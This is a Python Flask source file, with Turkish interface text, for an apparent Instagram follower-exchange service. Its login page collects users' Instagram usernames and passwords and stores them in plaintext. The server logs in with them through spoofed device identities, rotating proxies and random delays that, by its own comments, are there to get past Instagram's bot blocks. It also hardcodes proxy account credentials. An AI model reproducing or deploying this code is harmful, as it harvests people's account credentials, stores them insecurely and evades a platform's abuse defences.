import os, random, time, uuid
from flask import Flask, request, jsonify, render_template_string, session, redirect
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ClientError

app = Flask(__name__)
app.secret_key = "all_follow_v15_secret"
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v15.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    coins = db.Column(db.Integer, default=10)

# --- PROXY LIST ---
PROXY_LIST = [
    "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73263145:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
]

@app.route('/')
def index():
    body = """
    <div class="space-y-4">
        <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
        <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
        <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-sm">Giriş Yap</button>
        <p id="msg" class="text-xs text-center text-yellow-500 font-bold"></p>
    </div>
    <script>
        async function login(){
            const u=document.getElementById('u').value, p=document.getElementById('p').value;
            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
            btn.innerText="INSTAGRAM'A SIZILIYOR...";
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                msg.innerText = d.msg;
                if(d.status === "success") window.location.href = "/panel";
            } catch(e) { msg.innerText = "Bağlantı Hatası!"; }
            btn.innerText = "Giriş Yap";
        }
    </script>
    """
    return render_template_string("<html><body style='background:#000;color:#fff;'>{}</body></html>".format(body), title="Giriş")

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    
    # 📱 CİHAZ KİMLİĞİNİ RASTGELE OLUŞTUR (ENGELİ AŞMAK İÇİN)
    device_id = str(uuid.uuid4())
    cl.set_device({
        "app_version": "269.0.0.18.75",
        "android_version": 26,
        "android_release": "8.0.0",
        "device": "Samsung Galaxy S9",
        "model": "SM-G960F",
        "device_id": device_id,
        "uuid": str(uuid.uuid4()),
        "ad_id": str(uuid.uuid4())
    })

    px = random.choice(PROXY_LIST)
    cl.proxies = {"http": px, "https": px}
    
    try:
        # Saniyelerle oyna ki bot olduğun belli olmasın
        time.sleep(random.uniform(1, 3))
        if cl.login(u, p):
            user = User.query.filter_by(username=u).first()
            if not user:
                user = User(username=u, password=p)
                db.session.add(user)
            db.session.commit()
            session['user'] = u
            return jsonify(status="success", msg="Sızma Başarılı! ✅")
            
    except Exception as e:
        error_text = str(e)
        print("INSTA HATASI:", error_text)
        
        # Hata mesajlarını ben yazıyorum evet, ama gerçek sebebi bulalım:
        if "challenge" in error_text.lower() or "checkpoint" in error_text.lower():
            return jsonify(status="error", msg="ONAY GEREKLİ! Telefona bak.")
        if "bad_password" in error_text.lower():
            return jsonify(status="error", msg="ŞİFRE YANLIŞ!")
        if "rate_limit" in error_text.lower():
            return jsonify(status="error", msg="ÇOK FAZLA DENEME! Bekle.")
            
        return jsonify(status="error", msg="INSTAGRAM SENİ ENGELLEDİ! (Proxy'yi değiştir)")

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=10000)
